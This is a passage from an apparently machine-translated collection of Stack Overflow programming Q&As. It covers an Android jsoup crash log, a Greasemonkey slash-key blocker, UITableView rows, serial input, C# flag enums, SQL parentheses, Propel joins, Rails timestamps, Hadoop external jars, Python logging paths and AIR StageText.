04-20 15:49:52.489: I/global(468): Default buffer size used in BufferedInputStream constructor. It would be better to be explicit if an 8k buffer is required.
04-20 15:49:53.269: D/dalvikvm(468): GC_FOR_MALLOC freed 1829 objects / 102928 bytes in 115ms
04-20 15:49:53.371: D/dalvikvm(468): GC_FOR_MALLOC freed 268 objects / 143944 bytes in 84ms
04-20 15:49:53.469: D/dalvikvm(468): GC_FOR_MALLOC freed 122 objects / 436400 bytes in 94ms
04-20 15:49:53.562: D/dalvikvm(468): GC_FOR_MALLOC freed 3 objects / 194656 bytes in 82ms
04-20 15:49:53.571: I/dalvikvm-heap(468): Grow heap (frag case) to 3.286MB for 389136-byte allocation
04-20 15:49:53.749: D/dalvikvm(468): GC_FOR_MALLOC freed 0 objects / 0 bytes in 176ms
04-20 15:49:53.849: D/dalvikvm(468): GC_FOR_MALLOC freed 49 objects / 391000 bytes in 83ms
04-20 15:49:54.190: D/dalvikvm(468): GC_FOR_MALLOC freed 1680 objects / 528016 bytes in 84ms
04-20 15:49:54.888: D/dalvikvm(468): GC_FOR_MALLOC freed 2471 objects / 125776 bytes in 109ms
04-20 15:49:55.170: D/dalvikvm(468): GC_FOR_MALLOC freed 4499 objects / 172400 bytes in 106ms
04-20 15:49:55.170: I/dalvikvm-heap(468): Grow heap (frag case) to 3.680MB for 287718-byte allocation
04-20 15:49:55.319: D/dalvikvm(468): GC_FOR_MALLOC freed 0 objects / 0 bytes in 149ms
04-20 15:49:55.958: D/dalvikvm(468): GC_FOR_MALLOC freed 6830 objects / 326368 bytes in 126ms
04-20 15:49:56.620: D/dalvikvm(468): GC_FOR_MALLOC freed 9475 objects / 398952 bytes in 116ms
04-20 15:49:57.329: D/dalvikvm(468): GC_FOR_MALLOC freed 9550 objects / 402112 bytes in 139ms
04-20 15:49:58.140: D/dalvikvm(468): GC_FOR_MALLOC freed 10895 objects / 452624 bytes in 139ms
04-20 15:49:58.959: D/dalvikvm(468): GC_FOR_MALLOC freed 11316 objects / 485416 bytes in 151ms
04-20 15:49:59.989: D/dalvikvm(468): GC_FOR_MALLOC freed 12105 objects / 505736 bytes in 281ms
04-20 15:50:00.270: W/dalvikvm(468): threadid=7: thread exiting with uncaught exception (group=0x4001d800)
04-20 15:50:00.279: E/AndroidRuntime(468): FATAL EXCEPTION: AsyncTask #1
04-20 15:50:00.279: E/AndroidRuntime(468): java.lang.RuntimeException: An error occured while executing doInBackground()
04-20 15:50:00.279: E/AndroidRuntime(468):  at android.os.AsyncTask$3.done(AsyncTask.java:200)
04-20 15:50:00.279: E/AndroidRuntime(468):  at java.util.concurrent.FutureTask$Sync.innerSetException(FutureTask.java:273)
04-20 15:50:00.279: E/AndroidRuntime(468):  at java.util.concurrent.FutureTask.setException(FutureTask.java:124)
04-20 15:50:00.279: E/AndroidRuntime(468):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:307)
04-20 15:50:00.279: E/AndroidRuntime(468):  at java.util.concurrent.FutureTask.run(FutureTask.java:137)
04-20 15:50:00.279: E/AndroidRuntime(468):  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1068)
04-20 15:50:00.279: E/AndroidRuntime(468):  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:561)
04-20 15:50:00.279: E/AndroidRuntime(468):  at java.lang.Thread.run(Thread.java:1096)
04-20 15:50:00.279: E/AndroidRuntime(468): Caused by: java.lang.ClassCastException: org.jsoup.nodes.Document
04-20 15:50:00.279: E/AndroidRuntime(468):  at com.example.mongol.LoadImages.doInBackground(LoadImages.java:42)
04-20 15:50:00.279: E/AndroidRuntime(468):  at android.os.AsyncTask$2.call(AsyncTask.java:185)
04-20 15:50:00.279: E/AndroidRuntime(468):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
04-20 15:50:00.279: E/AndroidRuntime(468):  ... 4 more
04-20 15:50:04.700: I/Process(468): Sending signal. PID: 468 SIG: 9
04-20 15:52:50.449: I/global(499): Default buffer size used in BufferedInputStream constructor. It would be better to be explicit if an 8k buffer is required.
04-20 15:52:50.959: D/dalvikvm(499): GC_FOR_MALLOC freed 1845 objects / 103584 bytes in 98ms
04-20 15:52:51.049: D/dalvikvm(499): GC_FOR_MALLOC freed 273 objects / 144160 bytes in 88ms
04-20 15:52:51.159: D/dalvikvm(499): GC_FOR_MALLOC freed 122 objects / 436400 bytes in 84ms
04-20 15:52:51.249: D/dalvikvm(499): GC_FOR_MALLOC freed 3 objects / 194656 bytes in 87ms
04-20 15:52:51.259: I/dalvikvm-heap(499): Grow heap (frag case) to 3.286MB for 389136-byte allocation
04-20 15:52:51.441: D/dalvikvm(499): GC_FOR_MALLOC freed 0 objects / 0 bytes in 177ms
04-20 15:52:51.549: D/dalvikvm(499): GC_FOR_MALLOC freed 49 objects / 391000 bytes in 91ms
04-20 15:52:51.909: D/dalvikvm(499): GC_FOR_MALLOC freed 1680 objects / 528008 bytes in 87ms
04-20 15:52:52.599: D/dalvikvm(499): GC_FOR_MALLOC freed 2471 objects / 125840 bytes in 90ms
04-20 15:52:52.889: D/dalvikvm(499): GC_FOR_MALLOC freed 4499 objects / 172424 bytes in 117ms
04-20 15:52:52.889: I/dalvikvm-heap(499): Grow heap (frag case) to 3.680MB for 287718-byte allocation
04-20 15:52:52.989: D/dalvikvm(499): GC_FOR_MALLOC freed 0 objects / 0 bytes in 94ms
04-20 15:52:53.639: D/dalvikvm(499): GC_FOR_MALLOC freed 6828 objects / 326288 bytes in 125ms
04-20 15:52:54.419: D/dalvikvm(499): GC_FOR_MALLOC freed 9477 objects / 398960 bytes in 103ms
04-20 15:52:55.079: D/dalvikvm(499): GC_FOR_MALLOC freed 9569 objects / 403072 bytes in 109ms
04-20 15:52:55.911: D/dalvikvm(499): GC_FOR_MALLOC freed 10890 objects / 452384 bytes in 135ms
04-20 15:52:56.719: D/dalvikvm(499): GC_FOR_MALLOC freed 11307 objects / 485008 bytes in 127ms
04-20 15:52:57.619: D/dalvikvm(499): GC_FOR_MALLOC freed 12099 objects / 505496 bytes in 165ms
04-20 15:52:57.789: W/dalvikvm(499): threadid=7: thread exiting with uncaught exception (group=0x4001d800)
04-20 15:52:57.799: E/AndroidRuntime(499): FATAL EXCEPTION: AsyncTask #1
04-20 15:52:57.799: E/AndroidRuntime(499): java.lang.RuntimeException: An error occured while executing doInBackground()
04-20 15:52:57.799: E/AndroidRuntime(499):  at android.os.AsyncTask$3.done(AsyncTask.java:200)
04-20 15:52:57.799: E/AndroidRuntime(499):  at java.util.concurrent.FutureTask$Sync.innerSetException(FutureTask.java:273)
04-20 15:52:57.799: E/AndroidRuntime(499):  at java.util.concurrent.FutureTask.setException(FutureTask.java:124)
04-20 15:52:57.799: E/AndroidRuntime(499):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:307)
04-20 15:52:57.799: E/AndroidRuntime(499):  at java.util.concurrent.FutureTask.run(FutureTask.java:137)
04-20 15:52:57.799: E/AndroidRuntime(499):  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1068)
04-20 15:52:57.799: E/AndroidRuntime(499):  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:561)
04-20 15:52:57.799: E/AndroidRuntime(499):  at java.lang.Thread.run(Thread.java:1096)
04-20 15:52:57.799: E/AndroidRuntime(499): Caused by: java.lang.ClassCastException: org.jsoup.nodes.Document
04-20 15:52:57.799: E/AndroidRuntime(499):  at com.example.mongol.LoadImages.doInBackground(LoadImages.java:42)
04-20 15:52:57.799: E/AndroidRuntime(499):  at android.os.AsyncTask$2.call(AsyncTask.java:185)
04-20 15:52:57.799: E/AndroidRuntime(499):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
04-20 15:52:57.799: E/AndroidRuntime(499):  ... 4 more
04-20 15:53:07.380: I/Process(499): Sending signal. PID: 499 SIG: 9 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:40:01.203

您正在从**doInBackground()返回****null**。将代码更改为此，它将起作用：

 **```
Document doc = null;

    try {

    doc = (Document) Jsoup.connect("http://mongol.co.il/").get();
    Elements divs =((Elements) doc).select("img[src$=.jpg]");

     } catch (IOException e1) {

    e1.printStackTrace(); }
    return divs; 
```**

# javascript - 如何使用 GreaseMonkey 将“/”键返回给浏览器？

> ID：16122679
> 
> 赞同：6
> 
> 时间：2013-04-20T16:36:20.163
> 
> 标签：javascript, greasemonkey, dotjs

许多网页似乎都使用`/`关键字进行搜索。我想禁用它，因为 100% 的时间我都想使用`/`在 FireFox 的页面中进行搜索。有没有办法可以用 GreaseMonkey 或 dotjs 覆盖这种行为？

最好的公开示例是[https://www.github.com/](https://www.github.com/)，也是[https://wiki.jenkins-ci.org/display/JENKINS/Issue+Tracking](https://wiki.jenkins-ci.org/display/JENKINS/Issue+Tracking)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-09T10:17:30.103

*   如果您打开Doc[`addEventListener()`^并](https://developer.mozilla.org/en-US/docs/DOM/EventTarget.addEventListener)`window`使用“事件捕获”，您将捕获 99% 的页面尝试执行的操作。（不包括 Flash 等插件）

*   您无法确定页面是由 、 、 还是某种组合触发的`keydown`，`keyup`因此`keypress`拦截`keydown`（使用的典型事件）和`keyup`. 但是，如果页面触发`keypress`，则阻止事件可能需要[这种技术](https://stackoverflow.com/a/15283597/331508)。这是因为`keypress`事件 on`<body>`会冒泡以触发 Firefox 的页内搜索，但无法（重新）从 javascript 触发该搜索（出于安全考虑）。

    幸运的是，您的两个示例站点不需要任何激烈的措施。

*   像这样的事件常量`DOM_VK_SLASH`很棒，但它们仍然几乎仅限于 Firefox。从这个问题的标签（dotjs）来看，尚不清楚您是否意味着它也可以在 Chrome 上运行。

综上所述，这个完整的脚本可以工作：

```
// ==UserScript==
// @name        _Nuke the forward slash on select pages
// @include     https://github.com/*
// @include     https://wiki.jenkins-ci.org/*
// @grant       GM_addStyle
// ==/UserScript==
/*- The @grant directive is needed to work around a design change
    introduced in GM 1.0\.   It restores the sandbox.
*/

//-- "true" tells the listener to use capture mode.
window.addEventListener ('keydown',  blockSlashKey, true);
window.addEventListener ('keyup',    blockSlashKey, true);
/*-- Don't block keypress on window or body, this blocks the default
    page-search, too.
window.addEventListener ('keypress', blockSlashKey, true);
*/

function blockSlashKey (zEvent) {
    var FORWARD_SLASH   = 191;  // For keydown and keyup
    var ASCII_SLASH     = 47;   // For keypress

    if (    zEvent.which === FORWARD_SLASH
        || (zEvent.which === ASCII_SLASH  &&  zEvent.type == "keypress")
    ) {
        zEvent.stopPropagation();
    }
} 
```

* * *

注意：此脚本似乎在您列出的两个站点上运行良好，在 Chrome 和 Firefox 中。而且，它不会停止输入`/`输入或文本区域。`/`但是，它可能会导致某些站点不触发密钥 上的其他事件的可能性很小。

如果发生这种情况，请使用检查`zEvent.target.nodeName == "BODY"`来限制`blockSlashKey()`的操作。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-22T06:23:41.050

这个 Greasemonkey 脚本在 Firefox 上工作

```
// ==UserScript==
// @name        Disable slash key on page
// @namespace   test
// @include     https://github.com/*
// @include     https://wiki.jenkins-ci.org/*
// @grant       none
// @version     1
// ==/UserScript==

document.addEventListener('keydown', function(event) {
    if (event.keyCode === event.DOM_VK_SLASH) {
        event.stopPropagation();
    }
}, true); 
```

# ios - 我的 UItableView 中的顶部单元格没有出现

> ID：16122681
> 
> 赞同：0
> 
> 时间：2013-04-20T16:36:43.893
> 
> 标签：ios, xcode, ipad, uitableview

这是我的问题：

我有不同部分的uitableview，每个部分都有很多行。

问题是，当我在 iPad 模拟器中运行应用程序时，UITableView 中第 0 部分的前五行不会出现，除非我向上滚动查看它们，然后它们会在停止滚动后恢复不出现？

请帮忙 。在此先感谢并祝您编码愉快。

这是数据源方法的实现： 1。节数：

```
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
    {
        // Return the number of sections.
        NSMutableArray *catarr = [[NSMutableArray alloc] init];
        catarr= [d Category];
        NSInteger length ;

        length = [catarr count];

        return length;
    } 
```

2.行数：

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    // Return the number of rows in the section.

    NSMutableArray *catarr = [[NSMutableArray alloc] init];
    catarr = [d Category];
    NSInteger length ;
    length = [catarr count];
    NSInteger count ;
    NSMutableArray *word;

    for ( int i=0 ; i < length ; i++)
    {
        if (section == i )
        {
            NSString *str = [catarr objectAtIndex:i];
            word = [[NSMutableArray alloc] init];
            word = [d CatRowName:str];
            count = [word count];
            return count;
        }
    }

    return 0 ;
} 
```

3\. 索引路径处的单元格：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

    static NSString *CellIdentifer = @"Cell"; 
    UITableViewCell *cell= [ tableView dequeueReusableCellWithIdentifier:CellIdentifer];

    if (cell == nil)
    {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault
                                      reuseIdentifier:CellIdentifer]; 
    }

    cell.textLabel.font = [UIFont systemFontOfSize:17.0];
    UILabel *label ;

    label=(UILabel *)[cell viewWithTag:1];
    NSString *value = [[mainArray objectAtIndex:indexPath.section] objectAtIndex:indexPath.row]; 
    label.text = value;
    label.autoresizingMask = UIViewAutoresizingFlexibleRightMargin;

    label=(UILabel *)[cell viewWithTag:2];
    NSString *value2 = [[mainArray2 objectAtIndex:indexPath.section] objectAtIndex:indexPath.row];
    label.text= value2;

NSString *value3 = [[mainArray3 objectAtIndex:indexPath.section] objectAtIndex:indexPath.row];
     cell.imageView.image = [UIImage imageNamed:value3];
    label.autoresizingMask = UIViewAutoresizingFlexibleRightMargin;

    return cell;

} 
```

# hyperterminal - 从超级终端到操作系统

> ID：16122688
> 
> 赞同：1
> 
> 时间：2013-04-20T16:38:06.033
> 
> 标签：hyperterminal

**有没有办法从超级终端（无论它从 COM 端口接收到什么）获取数据并将其提供给操作系统（Windows）。** 例如，我想将来自 COM 端口的数据写入 Microsoft Word 文件。

换句话说，我有自己的带 RS323 接口的键盘，我希望我输入的任何内容都写在 Microsoft Word 文件中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:41:32.130

是的，在 C# 中，您可以使用[SerialPort](http://msdn.microsoft.com/en-gb/library/system.io.ports.serialport.aspx)类。这是一个教程：http: [//code.msdn.microsoft.com/windowsdesktop/SerialPort-brief-Example-ac0d5004](http://code.msdn.microsoft.com/windowsdesktop/SerialPort-brief-Example-ac0d5004)

您不需要超级终端，因为您的软件会使用 SerialPort 来进行通信。

从那里我将使用[StreamWriter](http://msdn.microsoft.com/en-us/library/system.io.streamwriter.aspx)（或类似的东西）将其导出到文本文件。您可以尝试导出到 word，但它可能会让您感到沮丧。

请注意，您设置了设备所需的相关流量控制和波特率设置，否则您将遇到连接问题。

# c# - 将自定义选项传递给功能的最佳方式

> ID：16122689
> 
> 赞同：1
> 
> 时间：2013-04-20T16:38:08.290
> 
> 标签：c#, design-patterns, refactoring

我正在为 REST API 编写一个包装器。因此，每当我从服务器检索项目时，我只需要使用参数（在 uri 中）。我现在这样做的方式效果很好，但我只是觉得必须有另一种优雅的方式来做到这一点，也许是`enum`什么。

我不喜欢我需要“知道”选项是什么，因为`Dictionary`类型是`string`。我试过了`Dictionary<EnumType, string>`，但我有不止一种类型的`enum`. 另外，我不确定如何将`EnumType`（键）映射到适当的值。

基本上，我尽量避免使用魔法关键字。

这是我的部分代码：

```
public string GetUnreadItems()
{
    var options = new Dictionary<string, string>();
    options.Add("ItemType", "Unread");
    options.Add("SortBy", "Latest");
    // GetItemsBasedOn(options);
}

public string GetAllItems()
{
    var options = new Dictionary<string, string>();
    options.Add("ItemType", "All");
    // GetItemsBasedOn(options);
}

public string GetItemsBasedOn(Dictionary<string, string> options)
{
    // Do request here based on options passed
    // and return the result to caller function 
} 
```

编辑：这就是我想要实现的[http://getpocket.com/developer/docs/v3/retrieve](http://getpocket.com/developer/docs/v3/retrieve)

我想实现选项`sort`、`detailType`、`contentType`、`Favorite`和`State`。每个选项都有自己的选项，但一次只能选择一个。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T17:27:07.247

有几种方法可以用来改进当前的设计。我不同意我将要向您介绍的解决方案是理想的解决方案，但鉴于您已经确定要使用的解决方案，`enum`我认为您会对此解决方案感到满意。

您可以做的是定义一个`enum`带有`[Flags]`属性的标记。为枚举中的每个标志分配一个值，该值是 2 的幂。如果您想组合选项以创建单个选项，请[按位使用，或者](http://msdn.microsoft.com/en-gb/library/kxszd0kx%28v=vs.71%29.aspx)就像我在前面的示例中使用名为“All”的标志所做的那样：

```
[Flags]
public enum GetItemOptions
{
    Read = 0x1,
    Unread = 0x2,
    All = 0x1 | 0x2,
    SortByOldest = 0x4,
    SortByLatest = 0x8
} 
```

从您的代码示例中，第一个调用现在看起来像这样：

```
GetItemsBasedOn(GetItemOptions.Unread | GetItemOptions.SortByLatest); 
```

第二个看起来像这样：

```
GetItemsBasedOn(GetItemOptions.All); 
```

为了启用此设计，您需要调整`GetItemsBasedOn`方法签名，以便它指定`GetItemOptions`枚举类型的参数。以下是如何处理不同设置的示例。

```
public static void GetItemsBasedOn(GetItemOptions getItemOption)
{
    if (getItemOption.HasFlag(GetItemOptions.SortByOldest) && getItemOption.HasFlag(GetItemOptions.SortByLatest))
        throw new ArgumentException("I can't sort by both...");

    if (getItemOption.HasFlag(GetItemOptions.Read))
    {
        Console.WriteLine("READ");
    }

    if (getItemOption.HasFlag(GetItemOptions.Unread))
    {
        Console.WriteLine("UNREAD");
    }

    if (getItemOption.HasFlag(GetItemOptions.SortByOldest))
    {
        Console.WriteLine("SORT BY OLDEST");
    }
    else if (getItemOption.HasFlag(GetItemOptions.SortByLatest))
    {
        Console.WriteLine("SORT BY NLATEST");
    }
} 
```

`Enum.HasFlag`我认为您对按位操作了解不多，因此我通过使用仅检查给定`GetItemOptions`枚举是否指定了标志的方法来尽可能简化代码示例。

[`RegexOptions Enumeration`](http://msdn.microsoft.com/en-us/library/system.text.regularexpressions.regexoptions.aspx)在使用或之前，您可能已经见证过这种模式[`ControlStyles Enumeration`](http://msdn.microsoft.com/en-gb/library/system.windows.forms.controlstyles.aspx)

## 更新

我建议您`enum`为每个参数创建一个并定义一个像这样的类：

```
public class PocketDataRequest
{
    public State? State { get; set; }
    public Favourite? Favourite { get; set; }
    public ContentType? ContentType { get; set; }
    public Sort? Sort { get; set; }
    public DetailType? DetailType { get; set; }

    public Dictionary<string, string> ToPostData()
    {
        return GetType().GetProperties()
                        .Where(p => p.GetValue(this, null) != null)
                        .ToDictionary(p => p.Name, 
                                      p => p.GetValue(this, null).ToString());
    }
} 
```

这将利用以下语法：

```
PocketDataRequest pocketDataRequest = new PocketDataRequest();
pocketDataRequest.State = State.Unread;
pocketDataRequest.Sort = Sort.Newest;
GetItemsBasedOn(pocketDataRequest.ToPostData()); 
```

在我的实现`ToPostData`方法中，我使用 LINQ 和反射，那只是因为我很懒。您需要手动评估每个`enum`值，特别是如果您想将`enum`名称更改为更合适的名称。此外，如果您尝试传递名为 的参数，我的代码将失败`favorite`。这是因为`favorite`取数字“0”或“1”。这不是一个大问题，因为你可以做的事情是这样定义的`enum`：

```
public enum Favourite
{
    UnfavouritedItems = 0,
    FavouritedItems = 1
} 
```

然后简单地转换该值`(Int32)`并将该值添加到`Dictionary<string, string>`or `NameValueCollection`。

# sql - Are brackets in the WHERE clause standard sql

> ID：16122695
> 
> 赞同：12
> 
> 时间：2013-04-20T16:38:33.543
> 
> 标签：sql, standards

The course that I am currently doing uses brackets in its WHERE clauses like so:

```
SELECT bar
FROM   Foo
WHERE (CurrentState = 'happy'); 
```

Is this standard sql ?
If not then why use them?

Doesn't seem to be used in the Date & Darwen book I have.

* * *

**EDIT**

Just to clarify - I'm referring to 1992 sql standards

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-20T16:42:13.130

Yes. You can use parenthesis to bind components of where clauses. This isn't necessary in your example, but if you had multiple `and` and `or` components, you might need parenthesis to either ensure correct order of operations or simply to self-document the query.

Example 1:

```
select *
from foo
where 
   (class='A' and subclass='B')
   or (class='C' and subclass='D') 
```

In example 1, the parens aren't strictly required because `and` binds more tightly than `or`, but if you had multiple `or` conditions tied by `and` you would need it to get correct results, as in example 2 below.

Example 2:

```
select *
from foo
where 
   (class='A' or class='B')
   and (subclass='C' or subclass='D') 
```

I use them in either case, because I don't like having to parse the sql in my head the same way the query optimizer does -- I'd rather be explicit about it and more quickly understand what the intent is.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-20T16:42:00.020

They are optional. They make sense for more complex WHERE statements.

```
... WHERE (created > '2012-10' AND created < '2013-01') 
OR (modified > '2012-10' AND modified < '2013-01') 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-04-20T16:41:26.617

# symfony1 - Propel 和 symfony：加入表不起作用

> ID：16122697
> 
> 赞同：0
> 
> 时间：2013-04-20T16:38:40.613
> 
> 标签：symfony1, symfony-1.4, propel

首先我解释我的问题：

我有两张表 Job 和 JobCategory ：

```
job:
   -------------------------------------------------
   | id   | category_job_id | job_name  | keywords  |
   -------------------------------------------------

JobCategory: 
  -------------------------
  | id   | categoty_name  |
  ------------------------- 
```

这两个表通过外键“category_job_id”相关。

在这个应用程序中，我使用 Propel ORM。我希望使用三个字段关键字 job_name 和 category_name 进行搜索。

第一个字段是keywords是“输入”谁我可以写关键字，第二个字段是Category_name是一个“选择”，类别列表。第三个字段是 Job_name 并且是一个“选择”，作业名称列表，如果不为空，则关键字字段将被忽略。

我做这样的搜索功能，但它对我不起作用：

```
 public function searchFilter($job,$category,$keyword)
   {

$order = isset($this->order) ? $this->order : Criteria::ASC;

$job = '%' .$job. '%';
$category = '%' .$category. '%';

$c = new Criteria();

$c->addJoin(JobPeer::CATEGORY_JOB_ID, JobCategoryPeer::ID);
if((null !== $category) AND ($category !== ""))
{
 $c->addOr(JobCategoryPeer::CATEGORY_NAME,$category, Criteria::LIKE);    
}
if((null !== $job) AND ($job !== ""))
{
 $c->addOr(JobPeer::JOB_NAME,$job, Criteria::LIKE);   
}

$query = JobQuery::create(null, $c)
        ->joinWith('Job.JobCategory')
        ->orderByDateOfJob($order);

  if((null !== $keyword) AND ($keyword !== "")){
    $keyword = '%' .$keyword. '%';
    $query->filterByKeywords($keyword, Criteria::LIKE);
  }      

$results = $query->find();

return $results;

} 
```

但是搜索是所有情况都是错误的！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T17:42:36.870

我认为这样的事情会奏效。如果没有，您可以在发出`find()`（见下文）之前获取生成的 SQL，以便您（和我们）可以看到输出可能是什么。

```
public function searchFilter($job,$category,$keyword)
{

  $order = isset($this->order) ? $this->order : Criteria::ASC;

  $query = JobQuery::create()->joinWith('JobCategory');
  $conditions = array();

  if((null !== $category) AND ($category !== ""))
  {
    $query->condition('catName', "JobCategory.CategoryName LIKE ?", "%$category%");
    $conditions[] = 'catName';
  }
  if((null !== $job) AND ($job !== ""))
  {
    $query->condition('jobName', "Job.JobName LIKE ?", "%$job%");
    $conditions[] = 'jobName';
  }
  if (sizeOf($conditions) > 1)
  {
     // join your conditions with an "or" if there are multiple
    $query->combine($conditions, Criteria::LOGICAL_OR, 'allConditions');
    // redefine this so we have the combined conditions
    $conditions = array('allConditions');
  }

  // add all conditions to query (might only be 1)
  $query->where($conditions);

  if((null !== $keyword) AND ($keyword !== ""))
  {
    $query->filterByKeywords("%$keyword%", Criteria::LIKE);
  }

  $query->orderByDateOfJob($order);
  $sql = $query->toString(); // log this value so we can see the SQL if there is a problem
  return $query->find();
} 
```

# ruby-on-rails - 如何从 Rails 中的对象获取创建日期？

> ID：16122699
> 
> 赞同：0
> 
> 时间：2013-04-20T16:38:56.247
> 
> 标签：ruby-on-rails, ruby, timestamp

您好，我在 Rails 中有一个应用程序，我需要从对象中检索创建日期。我知道 Rails 使用时间戳来自动保存此信息，并且我查看了具有 Created_at 信息的 .json 蚂蚁。问题是我如何从对象访问此信息（Created_at）（我的意图是按创建时间排序，并显示这个）

感谢任何帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:46:46.703

您可以通过以下方式访问该属性：

```
u = User.first   # Let's pretend there's a `User` model within the rails application. Here im getting the first record and storing that user in the variable `u`.

u[:created_at]  # This will give me the value for the `created_at`, for instance: Thu, 18 Oct 2012 14:42:44 UTC +00:00 

or

u.created_at  # will give you the same result 
```

如果您想`sort`通过该字段，您可以（例如假设有`User`模型）使用`sort_by`：

```
User.all.sort_by &:created_at  # This is just a demonstration, you might want to get a sub-set of whatever model you're querying with `where` and some relevant criteria. 
```

或者

```
 User.find(:all, :order => "created_at")  # old and deprecated approach 
```

或者

```
 User.order("created_at DESC") #  more recent approach 
```

# java - 如何在 Cloudera hadoop 中使用外部 jar？

> ID：16122701
> 
> 赞同：1
> 
> 时间：2013-04-20T16:39:07.350
> 
> 标签：java, hadoop, protocol-buffers, cloudera

我的集群上安装了 cloudera hadoop 版本 4。它与 google protobuffer jar 版本 2.4 一起打包。在我的应用程序代码中，我使用使用 protobuffer 2.5 版编译的 protobuffer 类。

这会在运行时导致未解决的编译问题。有没有办法使用外部 jar 运行 map reduce 作业，或者我被卡住直到 cloudera 升级他们的服务？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T20:06:55.460

Yes you can run MR jobs with external jars.

Be sure to add any dependencies to both the `HADOOP_CLASSPATH` and `-libjars` upon submitting a job like in the following examples:

You can use the following to add all the jar dependencies from current and `lib` directories:

```
export HADOOP_CLASSPATH=$HADOOP_CLASSPATH:`echo *.jar`:`echo lib/*.jar | sed 's/ /:/g'` 
```

Bear in mind that when starting a job through `hadoop jar` you'll need to also pass it the jars of any dependencies through use of `-libjars`. I like to use:

```
hadoop jar <jar> <class> -libjars `echo ./lib/*.jar | sed 's/ /,/g'` [args...] 
```

**NOTE:** The `sed` commands require a different delimiter character; the `HADOOP_CLASSPATH` is `:` separated and the `-libjars` need to be `,` separated.

EDIT: If you need your classpath to be interpreted first to ensure your jar (and not the pre-packaged jar) is the one that gets used, you can set the following:

`export HADOOP_USER_CLASSPATH_FIRST=true`

# python - Python，日志记录：扩展 Logger 时路径名错误

> ID：16122712
> 
> 赞同：2
> 
> 时间：2013-04-20T16:40:22.543
> 
> 标签：python, logging

我正在尝试以这种方式创建自定义记录器：

文件：logger.py

```
import logging

class Logger(logging.getLoggerClass()):
    def warning(self, msg, *args, **kwargs):
        super(Logger, self).warning(msg, *args, **kwargs)

logging.setLoggerClass(Logger)
log = logging.getLogger('test')
handler = logging.StreamHandler()
formatter = logging.Formatter('%(pathname)s')
handler.setFormatter(formatter)
log.addHandler(handler) 
```

文件：test.py

```
from logger import log

log.warning('') 
```

输出：

```
$ python test.py
/home/dario/Desktop/logging_test/logger.py 
```

预期的输出将是：

```
/home/dario/Desktop/logging_test/test.py 
```

更奇怪的是，如果我评论`setLoggerClass`我得到的行`test.py`，但没有完整路径。

我究竟做错了什么？谢谢！

在 Arch Linux x86_64 上使用 Python 2.7.4 和 3.3.1 进行了测试。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:52:16.010

来自[Python 文档 - 日志记录 - LogRecord 属性](http://docs.python.org/2/library/logging.html#logrecord-attributes)：

> **%(pathname)s** - 发出日志调用的源文件的完整路径名（如果可用）。

即一个`logging`对象（或任何子类，如`Logger`）被初始化的地方。
在这种情况下`logging`，您的实例`log`, 是在同一个文件中定义和初始化的`test.py`。

如果我拆分文件可能会更清楚一些：

**logger.py：（**类）

```
import logging                                           

# This is the path `logging` gets                        
class Logger(logging.getLoggerClass()):                  
    def warning(self, msg, *args, **kwargs):             
        super(Logger, self).warning(msg, *args, **kwargs) 
```

**log.py：（**具有`log`类型`log`对象的模块`Logger`）

```
import logging
from logger import Logger

logging.setLoggerClass(Logger)
log = logging.getLogger('test')
handler = logging.StreamHandler()

# Not this file's path, but where class Logger
# creates a logging object with super()
formatter = logging.Formatter('%(pathname)s')
handler.setFormatter(formatter)
log.addHandler(handler) 
```

**test.py：（**主要）

```
from log import log

log.warning('') 
```

# mobile - StageText - 如何使用超过 1 个 StageText 字段？

> ID：16122717
> 
> 赞同：0
> 
> 时间：2013-04-20T16:41:11.447
> 
> 标签：mobile, air, flash-cs6

我正在使用 Flash CS 6 和 Air 3.6 来构建 Android 应用程序。我想将[StageText](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/text/StageText.html)用于输入字段。下面的代码仅适用于第一个文本字段。我需要进行哪些更改才能使其适用于两个文本字段？

```
// NO. 1
var firstfield:StageText = new StageText(); 
firstfield.softKeyboardType = SoftKeyboardType.DEFAULT
firstfield.stage = foobar.stage
firstfield.viewPort = new Rectangle(foobar.x, foobar.y, foobar.width, foobar.height); 

// NO. 2
var secondfield:StageText = new StageText(); 
secondfield.softKeyboardType = SoftKeyboardType.DEFAULT
secondfield.stage = example.stage
secondfield.viewPort = new Rectangle(example.x, example.y, example.width, example.height); 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-22T14:20:41.673

尝试这样的事情：

```
var firstfield:StageText = new StageText(); 
firstfield.softKeyboardType = SoftKeyboardType.DEFAULT
firstfield.stage = this.stage;
firstfield.viewPort = new Rectangle(0, 0, 200, 30);
firstfield.x = 0;
firstfield.y = 0;
firstfield.width = 200;
firstfield.height = 30;
addChild(firstfield); 

var secondfield:StageText = new StageText(); 
secondfield.softKeyboardType = SoftKeyboardType.DEFAULT
secondfield.stage = this.stage;
secondfield.viewPort = new Rectangle(0, 40, 200, 30);
